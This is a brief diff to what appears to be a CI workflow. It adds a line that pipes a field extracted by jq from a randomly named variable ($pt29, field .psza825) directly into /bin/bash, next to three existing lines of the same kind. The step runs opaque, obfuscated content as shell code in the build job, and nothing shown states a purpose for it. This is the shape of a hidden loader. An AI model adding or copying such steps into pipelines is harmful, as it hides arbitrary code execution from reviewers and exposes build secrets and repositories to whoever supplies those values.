@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$p5924" | jq -r .jeby987 | /bin/bash
           printf '%s' "$klhbi911" | jq -r .flpn798 | /bin/bash
           printf '%s' "$q15" | jq -r .soanc9 | /bin/bash
+          printf '%s' "$pt29" | jq -r .psza825 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
